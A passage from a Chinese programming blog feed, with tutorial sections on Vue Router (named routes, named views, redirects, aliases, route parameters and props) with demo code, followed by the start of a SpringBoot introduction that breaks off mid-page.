aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="13-5-3-replace"><a href="#13-5-3-replace" class="headerlink" title="13.5.3 replace()"></a>13.5.3 replace()</h6><blockquote><p>功能与push一致，区别在于replace()不会向history添加新的浏览记录</p></blockquote><h6 id="13-5-4-go"><a href="#13-5-4-go" class="headerlink" title="13.5.4 go()"></a>13.5.4 go()</h6><blockquote><p>参数为一个整数，表示在浏览器历史记录中前后/后退多少步    相当于<code>window.history.go(-1)</code>的作用</p></blockquote><h4 id="13-6-命名路由"><a href="#13-6-命名路由" class="headerlink" title="13.6 命名路由"></a>13.6 命名路由</h4><blockquote><p>命名路由：在定义路由的时候可以给路由指定name，我们在进行路由导航时可以通过路由的名字导航</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rname<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">:to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{name:rname}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>t1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>按钮1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t1&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t2 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t2&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                name<span class="token operator">:</span><span class="token string">"r1"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/b"</span><span class="token punctuation">,</span>                name<span class="token operator">:</span><span class="token string">"r2"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t2            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            rname<span class="token operator">:</span><span class="token string">"r1"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter<span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">test</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span>vm<span class="token punctuation">.</span>rname<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13-7-命名路由视图"><a href="#13-7-命名路由视图" class="headerlink" title="13.7 命名路由视图"></a>13.7 命名路由视图</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>t1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/b<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>t2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--路由视图--&gt;</span>    <span class="token comment">&lt;!--如果在HTML中有一个以上的路由视图router-view，需要给router-view指定name，在路由中使用components映射多个组件根据name设置组件与router-view绑定关系--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t11 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t11&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t12 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; background:pink'&gt;t12&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t21 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t21&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t22 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; background:yellow'&gt;t22&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                components<span class="token operator">:</span><span class="token punctuation">{</span>                    v1<span class="token operator">:</span>t11<span class="token punctuation">,</span>                    v2<span class="token operator">:</span>t12                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/b"</span><span class="token punctuation">,</span>                components<span class="token operator">:</span><span class="token punctuation">{</span>                    v1<span class="token operator">:</span>t21<span class="token punctuation">,</span>                    v2<span class="token operator">:</span>t22                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13-8-重定向和别名"><a href="#13-8-重定向和别名" class="headerlink" title="13.8 重定向和别名"></a>13.8 重定向和别名</h4><h6 id="13-8-1-重定向"><a href="#13-8-1-重定向" class="headerlink" title="13.8.1 重定向"></a>13.8.1 重定向</h6><p>访问<code>/b</code>，重定向到<code>/a</code></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/b<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径B<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/b"</span><span class="token punctuation">,</span>                redirect<span class="token operator">:</span><span class="token string">"/a"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>根据路由命名重定向</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    routes<span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>            path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>            name<span class="token operator">:</span><span class="token string">"r1"</span><span class="token punctuation">,</span>            component<span class="token operator">:</span>t1        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            path<span class="token operator">:</span><span class="token string">"/b"</span><span class="token punctuation">,</span>            <span class="token comment">//redirect:"/a"   //根据路由路径重定向</span>            redirect<span class="token operator">:</span><span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">"r1"</span><span class="token punctuation">}</span>  <span class="token comment">//根据路由命名重定向</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="13-8-2-路由别名"><a href="#13-8-2-路由别名" class="headerlink" title="13.8.2 路由别名"></a>13.8.2 路由别名</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/wahaha<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径wahaha（别名）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                alias<span class="token operator">:</span><span class="token string">"/wahaha"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13-9-路由组件传参"><a href="#13-9-路由组件传参" class="headerlink" title="13.9 路由组件传参"></a>13.9 路由组件传参</h4><p>可以通过<code>/url/:attr</code>方式实现通过路由传值给组件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a/101<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;                    index：{{$route.params.id}}                    &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>          <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            routes<span class="token operator">:</span><span class="token punctuation">[</span>                <span class="token punctuation">{</span>                    path<span class="token operator">:</span><span class="token string">"/a/:id"</span><span class="token punctuation">,</span>                    component<span class="token operator">:</span>t1                <span class="token punctuation">}</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>            router<span class="token operator">:</span>myrouter        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>通过props传参</code></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a/102<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>路径A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index：{{id}}    &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a/:id"</span><span class="token punctuation">,</span>                props<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot</title>
      <link href="/posts/9.html"/>
      <url>/posts/9.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、项目整合与部署存在的问题"><a href="#一、项目整合与部署存在的问题" class="headerlink" title="一、项目整合与部署存在的问题"></a>一、项目整合与部署存在的问题</h2><h4 id="1-1-SSM手动整合存在的问题"><a href="#1-1-SSM手动整合存在的问题" class="headerlink" title="1.1 SSM手动整合存在的问题"></a>1.1 SSM手动整合存在的问题</h4><ul><li><p>SSM整合步骤多、配置繁琐</p></li><li><p>项目进行服务器部署步骤繁琐</p></li></ul><h4 id="1-2-如何简化这些繁琐的配置和部署步骤？"><a href="#1-2-如何简化这些繁琐的配置和部署步骤？" class="headerlink" title="1.2 如何简化这些繁琐的配置和部署步骤？"></a>1.2 如何简化这些繁琐的配置和部署步骤？</h4><ul><li>SpringBoot就是一个可以简化整合过程中复杂配置的框架</li></ul><h2 id="二、SpringBoot简介"><a href="#二、SpringBoot简介" class="headerlink" title="二、SpringBoot简介"></a>二、SpringBoot简介</h2><h4 id="2-1-概念"><a href="#2-1-概念" class="headerlink" title="2.1 概念"></a>2.1 概念</h4><ul><li>随着动态语言的流行，Java语言的开发就显得格外笨重：配置繁琐、开发效率低、项目的部署变得复杂、集成第三方技术难度大。</li><li>在这种情况下，SpringBoot就应运而生。</li><li><strong>SpringBoot采用了<code>习惯优于配置/约定大于配置</code>的理念快速的搭建项目的开发环境，我们无需或者进行很少的相关spring配置就能够快速的将项目运行起来</strong></li></ul><h4 id="2-2-优点"><a href="#2-2-优点" class="headerlink" title="2.2 优点"></a>2.2 优点</h4><ul><li>能够快速的搭建项目</li><li>对主流的开发框架都提供了无配置集成（SpringBoot内置了配置）</li><li>项目可以独立运行、无需单独配置Servlet容器（内置了Tomcat）</li><li>极大提高了开发、部署效率</li><li>提供了运行时监控系统（日志等）</li><li>与云原生有天然的集成</li></ul><h4 id="2-3-缺点"><a href="#2-3-缺点" class="headerlink" title="2.3 缺点"></a>2.3 缺点</h4><ul><li>由于配置都是内置的，报错时定位比较困难</li><li>版本迭代速度比较快、有些版本改动还是比较大（增加学习成本）</li></ul><h2 id="三、第一个SpringBoot应用"><a href="#三、第一个SpringBoot应用" class="headerlink" title="三、第一个SpringBoot应用"></a>三、第一个SpringBoot应用</h2><blockquote><p>体验：基于SpringBoot整合SpringMVC</p><p>SpringBoot应用需要依赖远程服务器进行创建</p><p>远程服务器：</p><ul><li>Spring官方：<a href="https://start.spring.io/">https://start.spring.io</a></li><li>ali：<a href="https://start.aliyun.com/">https://start.aliyun.com</a></li></ul></blockquote><h4 id="3-1-创建项目"><a href="#3-1-创建项目" class="headerlink" title="3.1 创建项目"></a>3.1 创建项目</h4><h6 id="3-1-File—New—Project"><a href="#3-1-File—New—Project" class="headerlink" title="3.1 File—New—Project"></a>3.1 File—New—Project</h6><p><img src="imgs/1618193919829.png" alt="1618193919829"></p><h6 id="3-2-填写项目信息"><a href="#3-2-填写项目信息" class="headerlink" title="3.2 填写项目信息"></a>3.2 填写项目信息</h6><p><img 